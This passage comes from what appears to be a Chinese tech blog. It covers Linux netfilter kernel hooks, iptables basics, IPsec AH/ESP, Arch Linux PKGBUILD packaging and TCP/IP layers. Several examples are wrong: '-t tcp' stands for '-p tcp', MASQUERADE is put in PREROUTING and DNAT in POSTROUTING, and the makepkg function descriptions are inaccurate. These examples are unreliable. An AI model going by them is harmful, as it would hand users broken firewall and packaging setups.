class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">ip_forward</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;<br>u32 mtu;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iphdr</span> *<span class="hljs-title">iph</span>;</span><span class="hljs-comment">/* Our header */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rtable</span> *<span class="hljs-title">rt</span>;</span><span class="hljs-comment">/* Route we use */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip_options</span> *<span class="hljs-title">opt</span>=</span> &amp;(IPCB(skb)-&gt;opt);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span> *<span class="hljs-title">net</span>;</span><br><br><span class="hljs-comment">/* that should never happen */</span><br><span class="hljs-keyword">if</span> (skb-&gt;pkt_type != PACKET_HOST)<br><span class="hljs-keyword">goto</span> drop;<br><br><span class="hljs-keyword">if</span> (unlikely(skb-&gt;sk))<br><span class="hljs-keyword">goto</span> drop;<br><br><span class="hljs-keyword">if</span> (skb_warn_if_lro(skb))<br><span class="hljs-keyword">goto</span> drop;<br><br><span class="hljs-keyword">if</span> (!xfrm4_policy_check(<span class="hljs-literal">NULL</span>, XFRM_POLICY_FWD, skb))<br><span class="hljs-keyword">goto</span> drop;<br><br><span class="hljs-keyword">if</span> (IPCB(skb)-&gt;opt.router_alert &amp;&amp; ip_call_ra_chain(skb))<br><span class="hljs-keyword">return</span> NET_RX_SUCCESS;<br><br>skb_forward_csum(skb);<br>net = dev_net(skb-&gt;dev);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *According to the RFC, we must first decrease the TTL field. If</span><br><span class="hljs-comment"> *that reaches zero, we must reply an ICMP control message telling</span><br><span class="hljs-comment"> *that the packet&#x27;s lifetime expired.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (ip_hdr(skb)-&gt;ttl &lt;= <span class="hljs-number">1</span>)<br><span class="hljs-keyword">goto</span> too_many_hops;<br><br><span class="hljs-keyword">if</span> (!xfrm4_route_forward(skb))<br><span class="hljs-keyword">goto</span> drop;<br><br>rt = skb_rtable(skb);<br><br><span class="hljs-keyword">if</span> (opt-&gt;is_strictroute &amp;&amp; rt-&gt;rt_uses_gateway)<br><span class="hljs-keyword">goto</span> sr_failed;<br><br>IPCB(skb)-&gt;flags |= IPSKB_FORWARDED;<br>mtu = ip_dst_mtu_maybe_forward(&amp;rt-&gt;dst, <span class="hljs-literal">true</span>);<br><span class="hljs-keyword">if</span> (ip_exceeds_mtu(skb, mtu)) &#123;<br>IP_INC_STATS(net, IPSTATS_MIB_FRAGFAILS);<br>icmp_send(skb, ICMP_DEST_UNREACH, ICMP_FRAG_NEEDED,<br>  htonl(mtu));<br><span class="hljs-keyword">goto</span> drop;<br>&#125;<br><br><span class="hljs-comment">/* We are about to mangle packet. Copy it! */</span><br><span class="hljs-keyword">if</span> (skb_cow(skb, LL_RESERVED_SPACE(rt-&gt;dst.dev)+rt-&gt;dst.header_len))<br><span class="hljs-keyword">goto</span> drop;<br>iph = ip_hdr(skb);<br><br><span class="hljs-comment">/* Decrease ttl after skb cow done */</span><br>ip_decrease_ttl(iph);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *We now generate an ICMP HOST REDIRECT giving the route</span><br><span class="hljs-comment"> *we calculated.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (IPCB(skb)-&gt;flags &amp; IPSKB_DOREDIRECT &amp;&amp; !opt-&gt;srr &amp;&amp;<br>    !skb_sec_path(skb))<br>ip_rt_send_redirect(skb);<br><br><span class="hljs-keyword">if</span> (net-&gt;ipv4.sysctl_ip_fwd_update_priority)<br>skb-&gt;priority = rt_tos2priority(iph-&gt;tos);<br><br><span class="hljs-keyword">return</span> NF_HOOK(NFPROTO_IPV4, NF_INET_FORWARD,<br>       net, <span class="hljs-literal">NULL</span>, skb, skb-&gt;dev, rt-&gt;dst.dev,<br>       ip_forward_finish);<br><br>sr_failed:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *Strict routing permits no gatewaying</span><br><span class="hljs-comment"> */</span><br> icmp_send(skb, ICMP_DEST_UNREACH, ICMP_SR_FAILED, <span class="hljs-number">0</span>);<br> <span class="hljs-keyword">goto</span> drop;<br><br>too_many_hops:<br><span class="hljs-comment">/* Tell the sender its packet died... */</span><br>__IP_INC_STATS(net, IPSTATS_MIB_INHDRERRORS);<br>icmp_send(skb, ICMP_TIME_EXCEEDED, ICMP_EXC_TTL, <span class="hljs-number">0</span>);<br>drop:<br>kfree_skb(skb);<br><span class="hljs-keyword">return</span> NET_RX_DROP;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="2-4-第四个挂接点（NF-INET-LOCAL-OUT"><a href="#2-4-第四个挂接点（NF-INET-LOCAL-OUT" class="headerlink" title="2.4.第四个挂接点（NF_INET_LOCAL_OUT)"></a>2.4.第四个挂接点（NF_INET_LOCAL_OUT)</h5><p>本机数据向外发送数据时刚从传输层出来第一个执行的hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __ip_local_out(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-keyword">struct</span> sk_buff *skb)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iphdr</span> *<span class="hljs-title">iph</span> =</span> ip_hdr(skb);<br><br>iph-&gt;tot_len = htons(skb-&gt;len);<br>ip_send_check(iph);<br><br><span class="hljs-comment">/* if egress device is enslaved to an L3 master device pass the</span><br><span class="hljs-comment"> * skb to its handler for processing</span><br><span class="hljs-comment"> */</span><br>skb = l3mdev_ip_out(sk, skb);<br><span class="hljs-keyword">if</span> (unlikely(!skb))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>skb-&gt;protocol = htons(ETH_P_IP);<br><br><span class="hljs-keyword">return</span> nf_hook(NFPROTO_IPV4, NF_INET_LOCAL_OUT,<br>       net, sk, skb, <span class="hljs-literal">NULL</span>, skb_dst(skb)-&gt;dev,<br>       dst_output);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="2-5-第五个挂接点-NF-INET-POST-ROUTING"><a href="#2-5-第五个挂接点-NF-INET-POST-ROUTING" class="headerlink" title="2.5.第五个挂接点(NF_INET_POST_ROUTING)"></a>2.5.第五个挂接点(NF_INET_POST_ROUTING)</h5><p>数据在执行路由选择之后即将进入链路层的时候执行的hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">ip_output</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_device</span> *<span class="hljs-title">dev</span> =</span> skb_dst(skb)-&gt;dev, *indev = skb-&gt;dev;<br><br>IP_UPD_PO_STATS(net, IPSTATS_MIB_OUT, skb-&gt;len);<br><br>skb-&gt;dev = dev;<br>skb-&gt;protocol = htons(ETH_P_IP);<br><br><span class="hljs-keyword">return</span> NF_HOOK_COND(NFPROTO_IPV4, NF_INET_POST_ROUTING,<br>    net, sk, skb, indev, dev,<br>    ip_finish_output,<br>    !(IPCB(skb)-&gt;flags &amp; IPSKB_REROUTED));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-流量在netfilter中的走向"><a href="#2-流量在netfilter中的走向" class="headerlink" title="2.流量在netfilter中的走向"></a>2.流量在netfilter中的走向</h3><p><img src="/images/iptables.png" alt="iptables"></p><h3 id="3-iptables的结构"><a href="#3-iptables的结构" class="headerlink" title="3.iptables的结构"></a>3.iptables的结构</h3><h4 id="4张表"><a href="#4张表" class="headerlink" title="4张表"></a>4张表</h4><ul><li><p>raw</p><p>用于赶上连接之前处理数据包,比如在数据流量大的时候,可以定义某条规则不进入跟踪链,提高iptables效率</p></li><li><p>mangle</p><p>用于修改数据包,如TOS,QOS</p></li><li><p>nat</p><p>用于数据包的网络地址转换</p></li><li><p>filter</p><p>用于数据包的过滤</p></li></ul><h4 id="五条链"><a href="#五条链" class="headerlink" title="五条链"></a>五条链</h4><ul><li><p>PREROUTING</p><p>用于路由器前转换(如源地址转换(SNAT))</p></li><li><p>INPUT</p><p>用于入站流量处理</p></li><li><p>FORWARD</p><p>用于转发流量处理</p></li><li><p>OUTPUT</p><p>用于出战流量处理</p></li><li><p>POSTROUTING</p><p>用于路由后转换(如目标地址转换(DNAT))</p></li></ul><h3 id="4-基本用法"><a href="#4-基本用法" class="headerlink" title="4.基本用法"></a>4.基本用法</h3><p>命令格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -t [table] COMMAND(chains) -p [protocol] -s [<span class="hljs-built_in">source</span> ip address] -d [destination ip address] ..... -j ACTION<br>-R/I/A(修改/插入/追加)<br>-t 指定表<br>-p 指定协议（tcp/udp/icmp)<br>-s 指定源ip地址(ip/mask)<br>-d 指定目标ip地址<br>--dport 指定目标端口<br>--sport 指定源端口<br>-j 指定处理类型(DROP/REJECT/ACCEPT/REDIRECT/MASQUERADE)(丢弃,丢弃并回应,允许,重定向,伪装源ip地址)<br>-m 指定扩展类型(multiport/state)<br>--state 指定连接状态(NEW,ESTABLISHED)<br>--tcp-flags(SYN,ACK,PSH,FIN,)<br>--icmp-type(指定icmp的标志位,echo-request,echo-reply)<br>-i 指定入站网卡<br>-o 指定出战网卡<br></code></pre></td></tr></table></figure><h5 id="配置链的默认策略"><a href="#配置链的默认策略" class="headerlink" title="配置链的默认策略"></a>配置链的默认策略</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -t filter -P INPUT DROP/ACCEPT<br></code></pre></td></tr></table></figure><h5 id="配置数据包过滤"><a href="#配置数据包过滤" class="headerlink" title="配置数据包过滤"></a>配置数据包过滤</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#配置</span><br>iptables -t filter -I INPUT -t tcp -s 0.0.0.0/0 -d 0.0.0.0/0 --dport 80 -j DROP<br></code></pre></td></tr></table></figure><h5 id="配置nat"><a href="#配置nat" class="headerlink" title="配置nat"></a>配置nat</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#配置源地址转换</span><br>iptables -t nat -I PREROUTING -s 0.0.0.0/0 -d 0.0.0.0 -j MASQUERADE<br><span class="hljs-comment">#配置目标地址转换</span><br>iptables -t nat -I POSTROUTING -s 0.0.0.0/0 -d 0.0.0.0/0 -j DNAT --to-destination 192.168.50.1/24<br></code></pre></td></tr></table></figure><h5 id="配置保存iptables规则"><a href="#配置保存iptables规则" class="headerlink" title="配置保存iptables规则"></a>配置保存iptables规则</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables-save &gt; ./iptables.txt<br></code></pre></td></tr></table></figure><h5 id="配置导入iptables规则"><a href="#配置导入iptables规则" class="headerlink" title="配置导入iptables规则"></a>配置导入iptables规则</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables-restore &lt; ./iptables.txt<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>iptable是linux中控制流量进出的非常有效的工具,在了解iptables的同时可以非常深刻的了解linux中接收流量后流量的走向。</p><p>参考:<a href="https://zhuanlan.zhihu.com/p/507786224">https://zhuanlan.zhihu.com/p/507786224</a></p>]]></content>
    
    
    <categories>
      
      <category>linux运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IPSEC VPN</title>
    <link href="/2022/04/27/IPSecVPN/"/>
    <url>/2022/04/27/IPSecVPN/</url>
    
    <content type="html"><![CDATA[<h2 id="IPSecVPN"><a href="#IPSecVPN" class="headerlink" title="IPSecVPN"></a>IPSecVPN</h2><h4 id="1-什么是IPSEC"><a href="#1-什么是IPSEC" class="headerlink" title="1.什么是IPSEC?"></a>1.什么是IPSEC?</h4><p>互联网安全协议(Internet Protocol Security)是一个协议包,透过对IP协议的分组进行加密和认证的网络传输协议族(一些相互关联的协议的集合)</p><p>IPsec主要由以下<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">协议</a>组成[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc2411-1">1]</a>[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc4308-2">2]</a>：</p><ol><li><p><a href="https://zh.wikipedia.org/zh-cn/IPsec#%E8%AE%A4%E8%AF%81%E5%A4%B4%EF%BC%88AH%EF%BC%89">认证头（AH）</a>，为IP<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E6%8A%A5">数据报</a>提供无连接<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E5%AE%8C%E6%95%B4%E6%80%A7">数据完整性</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%B6%88%E6%81%AF%E8%AE%A4%E8%AF%81&action=edit&redlink=1">消息认证</a>以及防<a href="https://zh.wikipedia.org/wiki/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB">重放攻击</a>保护[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc2402-3">3]</a>[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc4302-4">4]</a>；</p></li><li><p><a href="https://zh.wikipedia.org/zh-cn/IPsec#%E5%B0%81%E8%A3%85%E5%AE%89%E5%85%A8%E8%BD%BD%E8%8D%B7%EF%BC%88ESP%EF%BC%89">封装安全载荷（ESP）</a>，提供机密性、数据源认证、无连接完整性、防重放和有限的传输流（traffic-flow）机密性[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc2406-5">5]</a>；</p></li><li><p><a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E9%9A%9B%E7%B6%B2%E8%B7%AF%E9%87%91%E9%91%B0%E4%BA%A4%E6%8F%9B">因特网密钥交换</a>（英语： <a href="https://zh.wikipedia.org/w/index.php?title=Internet_Key_Exchange&action=edit&redlink=1">Internet Key Exchange</a> ，简称IKE或IKEv2），为 AH、ESP 操作所需的 <a href="https://zh.wikipedia.org/wiki/%E5%AE%89%E5%85%A8%E9%97%9C%E8%81%AF">安全关联（SA）</a> 提供算法、数据包和密钥参数[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc2409_sec1-6">6]</a>。</p><p>IPsec协议工作在<a href="https://zh.wikipedia.org/wiki/OSI%E6%A8%A1%E5%9E%8B">OSI模型</a>的第三层，使其在单独使用时适于保护基于<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">TCP</a>或<a href="https://zh.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%8D%8F%E8%AE%AE">UDP</a>的协议（如<a href="https://zh.wikipedia.org/wiki/%E5%AE%89%E5%85%A8%E5%A5%97%E6%8E%A5%E5%AD%90%E5%B1%82">安全套接子层</a>（<a href="https://zh.wikipedia.org/wiki/SSL">SSL</a>）就不能保护UDP层的通信流）。这就意味着，与传输层或更高层的协议相比，IPsec协议必须处理可靠性和分片的问题，这同时也增加了它的复杂性和处理开销。相对而言，<a href="https://zh.wikipedia.org/wiki/SSL">SSL</a>&#x2F;<a href="https://zh.wikipedia.org/wiki/TLS">TLS</a>依靠更高层的<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">TCP</a>（OSI的第四层）来管理可靠性和分片。</p></li></ol><h3 id="2-认证头-AH-Authentication-Header-协议号51"><a href="#2-认证头-AH-Authentication-Header-协议号51" class="headerlink" title="2.认证头(AH(Authentication Header))(协议号51)"></a>2.认证头(AH(Authentication Header))(协议号51)</h3><p><strong>认证头</strong>（Authentication Header，<strong>AH</strong>）被用来保证被传输分组的完整性和可靠性。此外，它还保护不受<a href="https://zh.wikipedia.org/wiki/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB">重放攻击</a>。认证头试图保护IP数据报的所有字段，那些在传输IP分组的过程中要发生变化的字段就只能被排除在外。当认证头使用非对称数字签名算法（如RSA）时，可以提供不可否认性<br><img src="/images/AH%E5%8C%85%E7%BB%93%E6%9E%84.png" alt="认证头">字段含义：</p><ul><li>下一个头：标识被传送数据所属的协议。</li><li>载荷长度：认证头包的大小。</li><li>保留：为将来的应用保留（目前都置为0）。</li><li>安全参数索引：与IP地址一同用来标识安全参数。</li><li>串行号：单调递增的数值，用来防止重放攻击。</li><li>认证数据：包含了认证当前包所必须的数据。</li></ul><p>AH协议会对数据和ip包头进行校验,因此AH协议不能穿透NAT,并且AH协议不会对数据进行加密,只会对数据进行校验</p><h3 id="3-封装载荷-协议号50"><a href="#3-封装载荷-协议号50" class="headerlink" title="3.封装载荷(协议号50)"></a>3.封装载荷(协议号50)</h3><p><strong>封装安全载荷</strong>（Encapsulating Security Payload，<strong>ESP</strong>）协议对分组提供了源可靠性、完整性和保密性的支持。与AH头不同的是，IP分组头部不被包括在内。</p><p><img src="/images/esp%E5%8C%85%E7%BB%93%E6%9E%84.png" alt="封装载荷"></p><ul><li>安全参数索引：与IP地址一同用来标识安全参数</li><li>串行号：单调递增的数值，用来防止重放攻击。</li><li>载荷数据：如果没使用ESP的加密功能，则载荷数据域的内容是“下一个头”所指示的数据；如果使用了ESP的加密功能，则使用加密载荷数据和ESP尾部数据所得的密文作为payload data.</li><li>填充：某些块加密算法用此将数据填充至块的长度。</li><li>填充长度：以位为单位的填充数据的长度。</li><li>下一个头：标识载荷中封装的数据所属的协议。</li><li>认证数据：又叫做完整性校验值（ICV）。包含了认证当前包所必须的数据。</li></ul><p>ESP协议不校验ip包头,并且提供数据包的加密和校验,</p>]]></content>
    
    
    <categories>
      
      <category>计算机基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>archlinux打包软件包步骤</title>
    <link href="/2022/04/24/archlinux%E6%89%93%E5%8C%85%E8%BD%AF%E4%BB%B6%E5%8C%85%E6%AD%A5%E9%AA%A4/"/>
    <url>/2022/04/24/archlinux%E6%89%93%E5%8C%85%E8%BD%AF%E4%BB%B6%E5%8C%85%E6%AD%A5%E9%AA%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="Archlinux打包软件包步骤"><a href="#Archlinux打包软件包步骤" class="headerlink" title="Archlinux打包软件包步骤"></a>Archlinux打包软件包步骤</h1><h3 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h3><p>archlinux中的软件包都是通过makepkg来打包的,makepkg工具会读取一个PKGBUILD的脚本,按照脚本里面的规则自动构建软件包,打包完成后会在打包的目录下面生成一个.pkg.tar.zst的文件,这个文件可以直接使用pacman包管理工具安装(pacman -U name.pkg.tar.zst)</p><h3 id="2-打包前的准备"><a href="#2-打包前的准备" class="headerlink" title="2.打包前的准备"></a>2.打包前的准备</h3><p>首先要准本打包的工具,一般有base-devel这个软件包就足够了,通常makepkg在打包的过程中主要做以下几个步骤:</p><ul><li><p>1.检查软件包的相关依赖是否已经安装</p></li><li><p>2.从指定的服务器下载软件包对应的源代码</p></li><li><p>3.解压对应的源代码</p></li><li><p>4.编译源码,并将其安装在伪root目录下面</p></li><li><p>5.生成包的元数据(metadata)</p></li><li><p>6.将伪root环境打包为一个tar文件后用zstd将其压缩</p></li><li><p>7.将生成的打包好的软件保存至配置好的目录下面</p></li></ul><h3 id="3-PKGBUILD写法"><a href="#3-PKGBUILD写法" class="headerlink" title="3.PKGBUILD写法"></a>3.PKGBUILD写法</h3><p>  PKGBUILD脚本中一般有以下几个变量和函数</p><ul><li>变量</li></ul><p>  1.pkgdesc</p><p>  软件包的描述信息</p><p>  2.pkgdir</p><p>  软件包存储的目录</p><p>  3.pkgname</p><p>  软件包的名称</p><p>  4.pkgver</p><p>  软件包的版本</p><p>  5.source</p><p>  软件的源码</p><p>  6.arch</p><p>  软件适用的架构,如果和平台无关可以直接填写any</p><p>  7.license</p><p>  软件的许可证</p><p>  8.depens</p><p>  软件的依赖</p><p>  9.srcdir</p><p>  软件源码的目录</p><ul><li>函数</li></ul><p>  1.prepare()</p><p>  此函数会执行用于预处理源文件执行的命令,例如patch,此函数执行在build之前</p><p>  2.pkgver()</p><p>  此函数会抓取并解压源文件,执行完prepare函数后执行此函数</p><p>  3.build()</p><p>  此函数第一步先进入源代码的目录下,makepkg会在执行build函数之前更改当前目录为pkgdir目录</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-variable">$pkgdir</span>/<span class="hljs-variable">$pkgname</span>-<span class="hljs-variable">$pkgver</span>&quot;</span><br>./configure --prefix=/usr<br>make<br></code></pre></td></tr></table></figure><p>  4.package()</p><p>  此函数会将编译好的文件安装值伪root环境下面</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">make DESTDIR=<span class="hljs-string">&quot;<span class="hljs-variable">$pkgdir</span>/&quot;</span> install <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件和系统配置</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux软件打包</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TCP/IP协议</title>
    <link href="/2022/04/18/TCP-IP%E5%8D%8F%E8%AE%AE/"/>
    <url>/2022/04/18/TCP-IP%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="TCP-x2F-IP协议"><a href="#TCP-x2F-IP协议" class="headerlink" title="TCP&#x2F;IP协议"></a>TCP&#x2F;IP协议</h1><h4 id="1-什么是TCP-x2F-IP协议"><a href="#1-什么是TCP-x2F-IP协议" class="headerlink" title="1.什么是TCP&#x2F;IP协议?"></a>1.什么是TCP&#x2F;IP协议?</h4><p>TCP&#x2F;IP（Transmission Control Protocol&#x2F;Internet Protocol，传输控制协议&#x2F;网际协议）是指能够在多个不同网络间实现信息传输,网络通信的协议簇。TCP&#x2F;IP协议不仅仅指的是TCP 和IP两个协议，而是指一个由FTP、SMTP、TCP、UDP、IP等协议构成的协议簇， 只是因为在TCP&#x2F;IP协议中TCP协议和IP协议最具代表性，所以被称为TCP&#x2F;IP协议。</p><h4 id="2-TCP-x2F-IP协议的具体含义"><a href="#2-TCP-x2F-IP协议的具体含义" class="headerlink" title="2.TCP&#x2F;IP协议的具体含义"></a>2.TCP&#x2F;IP协议的具体含义</h4><p>从字面意义上讲，有人可能会认为 TCP&#x2F;IP 是指 TCP 和 IP 两种协议。实际生活当中有时也确实就是指这两种协议。然而在很多情况下，它只是利用 IP 进行通信时所必须用到的协议群的统称。具体来说，IP 或 ICMP、TCP 或 UDP、TELNET 或 FTP、以及 HTTP 等都属于 TCP&#x2F;IP 协议。他们与 TCP 或 IP 的关系紧密，是互联网必不可少的组成部分。TCP&#x2F;IP 一词泛指这些协议，因此，有时也称 TCP&#x2F;IP 为网际协议群。</p><p>互联网进行通信时，需要相应的网络协议，TCP&#x2F;IP 原本就是为使用互联网而开发制定的协议族。因此，互联网的协议就是 TCP&#x2F;IP，TCP&#x2F;IP 就是互联网的协议。</p><table><thead><tr><th>OSI七层模型</th><th>TCP&#x2F;IP模型</th><th>功能</th><th>TCP&#x2F;IP协议族</th></tr></thead><tbody><tr><td>应用层</td><td>应用层</td><td>提供即时通讯,文件传输,虚拟终端等</td><td>HTTP,FTP,TFTP,DNS,SMTP,POP3</td></tr><tr><td>表示层</td><td></td><td>提供数据的编码和数据的加密</td><td></td></tr><tr><td>会话层</td><td></td><td>建立进程间的联系</td><td></td></tr><tr><td>传输层</td><td>传输层</td><td>提供进程到进程,端对端的通信</td><td>TCP、UDP</td></tr><tr><td>网络层</td><td>网络层</td><td>实现数据包的路由</td><td>IP ICMP IGMP BGP RIP OSPF</td></tr><tr><td>数据链路层</td><td>数据链路层</td><td>提供差错校验</td><td>ARP RARP PPP</td></tr><tr><td>物理层</td><td></td><td>承载上层数据</td><td></td></tr></tbody></table><h4 id="3-网络数据格式"><a href="#3-网络数据格式" class="headerlink" title="3.网络数据格式"></a>3.网络数据格式</h4><p><img src="/images/packet.jpeg" alt=" 网络数据的封装"></p><p>网络中传输的数据包含两部分,一部分为协议头,存储了该层必要的控制信息,而且每一层都会将上一层的控制信息和上一层的数据部分作为本层的数据部分</p><h4 id="4-以太网协议"><a href="#4-以太网协议" class="headerlink" title="4.以太网协议"></a>4.以太网协议</h4><p><strong>以太网</strong>（英语：Ethernet）是一种<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA">计算机</a><a href="https://zh.wikipedia.org/wiki/%E5%B1%80%E5%9F%9F%E7%BD%91">局域网</a>技术。<a href="https://zh.wikipedia.org/wiki/IEEE">IEEE</a>组织的IEEE 802.3标准制定了以太网的技术标准，它规定了包括<a href="https://zh.wikipedia.org/wiki/OSI%E6%A8%A1%E5%9E%8B">物理层</a>的连线、电子信号和<a href="https://zh.wikipedia.org/wiki/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6">介质访问控制</a>的内容。以太网是目前应用最普遍的局域网技术，取代了其他局域网标准如<a href="https://zh.wikipedia.org/wiki/%E4%BB%A4%E7%89%8C%E7%8E%AF">令牌环</a>、<a href="https://zh.wikipedia.org/wiki/FDDI">FDDI</a>和<a href="https://zh.wikipedia.org/w/index.php?title=ARCNET&action=edit&redlink=1">ARCNET</a>。</p><p>以太网的标准<a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E7%B5%A1%E6%8B%93%E6%92%B2">拓扑</a>结构为<a href="https://zh.wikipedia.org/wiki/%E5%8C%AF%E6%B5%81%E6%8E%92%E6%8B%93%E6%92%B2">总线型拓扑</a>，但目前的快速以太网（<a href="https://zh.wikipedia.org/w/index.php?title=100BASE-T&action=edit&redlink=1">100BASE-T</a>、<a href="https://zh.wikipedia.org/wiki/1000BASE-T">1000BASE-T</a>标准）为了减少冲突，将能提高的网络速度和使用效率最大化，使用<a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E8%B7%AF%E4%BA%A4%E6%8F%9B%E5%99%A8">交换机</a>（Switch hub）来进行网络连接和组织。如此一来，以太网的拓扑结构就成了<a href="https://zh.wikipedia.org/wiki/%E6%98%9F%E5%9E%8B%E7%BD%91">星型</a>；但在逻辑上，以太网仍然使用总线型拓扑和<a href="https://zh.wikipedia.org/wiki/CSMA/CD">CSMA&#x2F;CD</a>（Carrier Sense Multiple Access&#x2F;Collision Detection，即载波多重访问&#x2F;碰撞侦测）的总线技术。</p><h5 id="4-1-以太网包头"><a 